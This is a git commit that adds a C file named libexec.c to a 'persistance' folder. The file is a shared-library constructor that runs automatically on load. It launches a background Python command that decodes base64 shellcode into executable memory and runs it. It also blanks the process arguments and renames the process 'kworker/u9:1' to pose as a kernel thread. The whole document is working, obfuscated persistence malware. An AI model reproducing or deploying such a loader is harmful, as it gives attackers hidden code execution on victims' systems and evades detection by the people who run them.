ad0e73bf4e72ea5294608cbc5ef39ab0d510e7d4
mephistolist <49227141+mephistolist@users.noreply.github.com>
2025-06-08 01:23:24 +0000

    Create libexec.c

---
+++ persistance/libexec.c
@@ -0,0 +1,21 @@
+#include <stdlib.h>
+
+__attribute__((constructor))
+static void run_python(void) {
+    system(
+        "python3 -c \""
+        "import base64, mmap, ctypes, sys, os;"
+        "encoded=\\\"SDHJSIHp+f///0iNBe////9Iu2aWcpLFaW45SDFYJ0gt+P///+L0Li5d8KwHQUoOluvCkTY8Xw67EcabO4Y2ZpZyvbAaHBYE/xy9rQYWUQeWJMWRNwQCPpl3ksVpbjk=\\\";"
+        "raw=base64.b64decode(encoded);"
+        "mem=mmap.mmap(-1,len(raw),mmap.MAP_PRIVATE|mmap.MAP_ANONYMOUS,"
+        "mmap.PROT_WRITE|mmap.PROT_READ|mmap.PROT_EXEC);"
+        "mem.write(raw);"
+        "addr=ctypes.addressof(ctypes.c_char.from_buffer(mem));"
+        "shell_func=ctypes.CFUNCTYPE(None)(addr);"
+        "[sys.argv.__setitem__(i,'\\0'*len(sys.argv[i])) for i in range(len(sys.argv))];"
+        "libc=ctypes.CDLL(None);"
+        "libc.prctl(15,b\\\"kworker/u9:1\\\",0,0,0);"
+        "shell_func()\""
+        " > /dev/null 2>&1 &"
+    );
+}
